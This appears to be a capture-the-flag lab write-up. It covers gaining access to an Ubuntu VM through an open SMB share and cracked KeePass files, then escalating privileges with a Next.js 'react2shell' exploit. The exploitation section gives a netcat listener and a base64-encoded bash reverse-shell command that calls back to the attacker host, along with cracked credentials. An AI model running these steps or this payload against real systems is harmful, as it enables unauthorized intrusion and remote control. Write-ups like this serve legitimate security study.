## NMAP SCAN

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:21:ee:3d:29:d5:b1:11:e2:af:23:c5:be:3f:ba:f3 (RSA)
|   256 58:2e:22:94:07:d8:03:aa:35:20:58:a0:e7:95:70:d3 (ECDSA)
|_  256 09:01:6b:da:05:46:c3:fd:09:56:c0:76:60:45:f5:81 (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 00:0C:29:13:0A:D1 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-02-13T06:29:14
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: -6h00m02s
```

## Initial Foothold

Enumerating SMB we find that we can access the `backup` share

![](screenshots/Pasted%20image%2020260213120105.png)

Using smbclient to access the backup share we discover many directories.

![](screenshots/Pasted%20image%2020260213120140.png)

Listing after turning on recurse we discover many empty files and 2 kdbx files in “Test 7” directory which we download.

![](screenshots/Pasted%20image%2020260213120322.png)



![](screenshots/Pasted%20image%2020260213120454.png)

Using keep2john to extract the hash and cracking them, we find the password for database2: “50cent”

![](screenshots/Pasted%20image%2020260213120830.png)

Open the Database2.kdbx file using keepass2 with the cracked password.

![](screenshots/Pasted%20image%2020260213120928.png) 

We discover creds for user `alberto::@VJ8Kh&3vzVj@N`

![](screenshots/Pasted%20image%2020260213121038.png)

We then use ssh to login and get the user.txt flag along with a todo.md file

![](screenshots/Pasted%20image%2020260213121130.png)
## Privilege Escalation

The todo.md file mentions react and nextjs. Doing some research we discover a very recent vulnerability react2shell.

Then we do some network enumeration and find that there is something running on localhost port 3000 

![](screenshots/Pasted%20image%2020260213121302.png)

We setup a ssh tunnel using sshpass

```
sshpass -p '@VJ8Kh&3vzVj@N' ssh -L 3000:127.0.0.1:3000 alberto@192.168.19.130
```

![](screenshots/Pasted%20image%2020260213121444.png)

Perform nmap scan on the tunneled port to discover more about it

![](screenshots/Pasted%20image%2020260213121524.png)

The nmap scan reveals some http headers (Vary: RSC …) which tells us that this port is running the vulnerable react and next js instance.

### Exploitation

Go to revshells.com and generate a Bash -i reverse shell, base64 encode it.

![](screenshots/Pasted%20image%2020260213121800.png)

```
git clone https://github.com/snipevx/React2Shell-POC.git && cd React2Shell-POC

# start a netcat listener on your specified port
nc -lvnp 1337

python poc.py -u http://127.0.0.1:3000/ -c \
 'echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xOS4xMjgvMTMzNyAwPiYx|base64 -d|bash'
```

![](screenshots/Pasted%20image%2020260213122045.png)